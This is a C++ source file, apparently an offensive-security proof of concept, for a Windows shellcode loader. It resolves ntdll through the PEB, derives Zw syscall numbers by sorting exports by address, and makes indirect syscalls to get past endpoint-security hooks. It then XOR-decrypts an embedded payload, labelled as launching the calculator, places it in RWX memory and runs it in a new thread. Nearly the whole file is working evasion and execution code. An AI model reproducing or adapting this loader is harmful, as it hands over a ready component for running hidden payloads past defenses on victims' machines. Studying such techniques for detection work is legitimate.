// You got my SSN so syscall me maybe?


#include <iostream>
#include <Windows.h>
#include "Structs.h"
#include <vector>
#include <unordered_map>
#include <algorithm>
#include <iomanip>
#include <iterator>
#include "Syscalls.h"

typedef unsigned __int64 QWORD, * PQWORD;
#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )  
#define ZwCurrentProcess() NtCurrentProcess()     

//gloabl variables
BYTE syscall_code[] = { 0x0f, 0x05, 0xc3 };
std::unordered_map<std::string, ZW_ATTR> zwFunctions;
//extern because they are used in the ASM code as well
extern "C" DWORD SSN = 0;
extern "C" QWORD SYSCALLADDR = 0;

//lowercase wide string
LPWSTR ToLowerCaseWIDE(LPCWSTR str) {

	static WCHAR lowStr[MAX_PATH];
	size_t i = 0;

	while (str[i] != L'\0') {
		if (str[i] >= L'A' && str[i] <= L'Z') {
			lowStr[i] = str[i] + 32; // Convert uppercase to lowercase
		}
		else {
			lowStr[i] = str[i];
		}
		i++;
	}
	lowStr[i] = L'\0';
	return lowStr;
}

//return random integer within a range
int randomInt(int max) {

	// Providing a seed value
	srand((unsigned)time(NULL));
	// Get a random number
	int random = 1 + (rand() % max);
	return random;
}

//return random pair object from map, using the randomInt defined above
std::pair<std::string, ZW_ATTR> randomMapElement(std::unordered_map<std::string, ZW_ATTR> zwFunctions) {
	
	auto it = zwFunctions.begin();
	std::advance(it, randomInt((int)zwFunctions.size()));
	return *it;
}

//create new comparator, so that we can choose basing on what parameter we want to out the map
bool sortByAddr(std::pair<std::string, ZW_ATTR> &a, std::pair<std::string, ZW_ATTR> &b) {

	return (a.second.addr < b.second.addr);

}

//sort map with custom comparator defined above
std::unordered_map<std::string, ZW_ATTR> sortMap(std::vector<std::pair<std::string, ZW_ATTR>> vec) {

	//sorting vector by memory addr
	sort(vec.begin(),vec.end(), sortByAddr);
	//assigning SSN basing on the index since addresses are sorted by now
	for (int i = 0; i < vec.size(); i++) {
		vec[i].second.ssn = i;
	}
	//creating map for easy access
	std::unordered_map<std::string, ZW_ATTR> sortedMap;
	for (auto& pair : vec) {
		// Inserting into the map with the first element (name of the function) of the pair as the key
		sortedMap[pair.first] = pair.second;
	}
	return sortedMap;
}

//retrieve syscall instructions address matching the sequence of bytes representing the syscall ops
PBYTE retrieveSCAddr(PBYTE funcStar) {

	//we do not want to go too far if we do not find it for some reason
	int emergencybreak = 0;
	while (funcStar && emergencybreak < 2048) {
		//taking into account indianess crazyness
		if (funcStar[0] == syscall_code[0] && funcStar[1] == syscall_code[1] && funcStar[2] == syscall_code[2]) {
		
			return funcStar; 
		}
		funcStar++;
		emergencybreak++;
	}
	return NULL;
}

//we all know what this is about
HMODULE GetModuleHandleOb(LPCWSTR szModuleName) {

	PPEB					pPeb = (PEB*)(__readgsqword(0x60));


	PPEB_LDR_DATA			pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
	PLDR_DATA_TABLE_ENTRY	pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

	while (pDte) {

		if (pDte->FullDllName.Length != NULL) {

			if (wcscmp(ToLowerCaseWIDE(pDte->FullDllName.Buffer),szModuleName)==0) {
				
				return (HMODULE)(pDte->InInitializationOrderLinks.Flink);
			}
		}
		else {
			break;
		}
		pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);

	}

	return NULL;
}

//parse ntdll.dll in memory in order to retrieve all the ZwFunctions
std::unordered_map<std::string, ZW_ATTR> findZWFunctions(IN HMODULE hModule) {

	PBYTE syscallAddr = NULL;
	std::vector<std::pair<std::string, ZW_ATTR>> vec;
	PBYTE pBase = (PBYTE)hModule;
	PIMAGE_DOS_HEADER	pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;

	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return {};

	PIMAGE_NT_HEADERS	pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return {};
	
	IMAGE_OPTIONAL_HEADER	ImgOptHdr = pImgNtHdrs->OptionalHeader;
	PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
	PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
	PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {

		CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
		//compare only first two chars
		if (strncmp(pFunctionName, "Zw", 2) == 0) {
			//retrieve the syscall opcodes address
			syscallAddr = retrieveSCAddr((PBYTE)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]));
			//initialize the struct with a null SSN
			ZW_ATTR attr = {0, (FARPROC)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]), syscallAddr };
			//initialize the vector
			vec.push_back({ pFunctionName, attr });			
		}
	}
	//return a bella sorted hashmap
	return sortMap(vec);
}

//simple xor function
VOID OBXOR(PBYTE pShellcode, SIZE_T sShellcodeSize, PBYTE bKey, SIZE_T sKeySize) {
	for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {
		if (j >= sKeySize) {
			j = 0;
		}
		pShellcode[i] = pShellcode[i] ^ bKey[j];
	}
}

//prep syscall ops - set gloab extern variables used in the ASM code
VOID prepSysCall(const char* ZwFunction) {

	SSN = (DWORD)zwFunctions[ZwFunction].ssn;
	do {
		SYSCALLADDR = (QWORD)randomMapElement(zwFunctions).second.syscallc;
	} while (SYSCALLADDR == 0);
}

//x64 calc exec
unsigned char Payload[] =
"\x56\x09\xC6\x28\x5A\xA9\x85\xCC\xAA\x41\x04\x9D\xEB\x11"
"\x17\x9D\xFC\x09\x74\x1E\xCF\x09\xCE\x9E\xCA\x09\xCE\x9E"
"\xB2\x09\xCE\x9E\x8A\x09\xCE\xBE\xFA\x09\x4A\x7B\xE0\x0B"
"\x08\xFD\x63\x09\x74\x0C\x06\x7D\x24\xB0\xA8\x6D\x65\x8D"
"\x6B\x88\x48\x8D\xAB\x80\xA7\x21\xF8\x00\x14\x84\x21\x13"
"\x65\x47\xE8\x7D\x0D\xCD\x7A\xCA\xC5\x44\xAA\x41\x45\x84"
"\x2F\x81\x31\xAB\xE2\x40\x95\x9C\x21\x09\x5D\x88\x21\x01"
"\x65\x85\xAB\x91\xA6\x9A\xE2\xBE\x8C\x8D\x21\x75\xCD\x84"
"\xAB\x97\x08\xFD\x63\x09\x74\x0C\x06\x00\x84\x05\xA7\x00"
"\x44\x0D\x92\xA1\x30\x3D\xE6\x42\x09\xE8\xA2\x04\x7C\x1D"
"\xDF\x99\x1D\x88\x21\x01\x61\x85\xAB\x91\x23\x8D\x21\x4D"
"\x0D\x88\x21\x01\x59\x85\xAB\x91\x04\x47\xAE\xC9\x0D\xCD"
"\x7A\x00\x1D\x8D\xF2\x1F\x1C\x96\xEB\x19\x04\x95\xEB\x1B"
"\x0D\x4F\x46\x61\x04\x9E\x55\xA1\x1D\x8D\xF3\x1B\x0D\x47"
"\xB8\xA8\x12\x33\x55\xBE\x18\x84\x10\x40\x45\xCC\xAA\x41"
"\x45\xCC\xAA\x09\xC8\x41\xAB\x40\x45\xCC\xEB\xFB\x74\x47"
"\xC5\xC6\xBA\x19\x11\xA1\x58\xE6\xA0\x00\xFF\x6A\x3F\xFC"
"\xD8\x33\x7F\x09\xC6\x08\x82\x7D\x43\xB0\xA0\xC1\xBE\x2C"
"\xDF\x44\xFE\x8B\xB9\x33\x2A\xA6\xAA\x18\x04\x45\x70\xBE"
"\x90\xAF\xCB\x2D\x26\xCC";

BOOL executePayload(std::unordered_map<std::string, ZW_ATTR> zwFunctions, unsigned char payload[], SIZE_T payloadSize) {

	PVOID pAddress = NULL;
	SIZE_T sSize = payloadSize;
	NTSTATUS STATUS = 0x00;
	SIZE_T sNumberOfBytesWritten = NULL;
	HANDLE hThread = NULL;
	ULONG uOldProtection = NULL;

	prepSysCall("ZwAllocateVirtualMemory");
	if ((STATUS = ZwAllocateVirtualMemory(ZwCurrentProcess(), &pAddress, 0, &sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
		printf("[-] Error while allocating memory. Code: %lu \n", STATUS);
		return FALSE;
	}
	printf("[+] Address of allocated memory: 0x%p\n", pAddress); 
	/*--------------------------------------------------------------------*/
	prepSysCall("ZwWriteVirtualMemory");
	if ((STATUS = ZwWriteVirtualMemory(ZwCurrentProcess(), pAddress, payload, payloadSize, &sNumberOfBytesWritten)) != 0) {
		printf("[-] Error while writing virtual memory. Code: %lu \n", STATUS);
		return FALSE;
	}
	printf("[+] Payload written successfully\n");
	/*--------------------------------------------------------------------*/
	prepSysCall("ZwProtectVirtualMemory");
	if ((STATUS = ZwProtectVirtualMemory(ZwCurrentProcess(), &pAddress, &payloadSize, PAGE_EXECUTE_READWRITE, &uOldProtection)) != 0) {
		printf("[-] Error while changing memory protections. Code: %lu \n", STATUS);
		return FALSE;
	}
	printf("[+] Memory is now RWX\n");
	/*--------------------------------------------------------------------*/
	prepSysCall("ZwCreateThreadEx");
	if ((STATUS = ZwCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, ZwCurrentProcess(), pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
		printf("[!] Error while creating thread. Code: %lu \n", STATUS);
		return FALSE;
	}
	printf("[+] Executed thread with Id : %d\n", GetThreadId(hThread));
	//forgot and too lazy to indirect-syscall this one too
	WaitForSingleObject(hThread,0xFFFFFFFF);
	return TRUE;
}

int main()
{
	BYTE key[] = { 0xAA, 0x41, 0x45, 0xCC };
	size_t key_size = sizeof(key);
	//get ntdll handle
	HMODULE ntdllBase = GetModuleHandleOb(L"ntdll.dll");
	if (ntdllBase == NULL) {
		std::cerr << "[-] Error while getting an handle on NTDLL.dll" << std::endl;
		return 1;
	}
	//fill the map with the zwfunctions objects
	zwFunctions = findZWFunctions(ntdllBase);
	if (zwFunctions.size() == 0) {
		std::cerr << "[-] Error while retrieving ZW functions" << std::endl;
		return 1;
	}
	//decrypt payload
	OBXOR(Payload, sizeof(Payload), key, key_size);
	//execute payload via indirect syscall
	if (executePayload(zwFunctions, Payload, sizeof(Payload))) {
		std::cout << "[+] Shellcode ran successufully, ciao grande!" << std::endl;
	}
	return 0;
}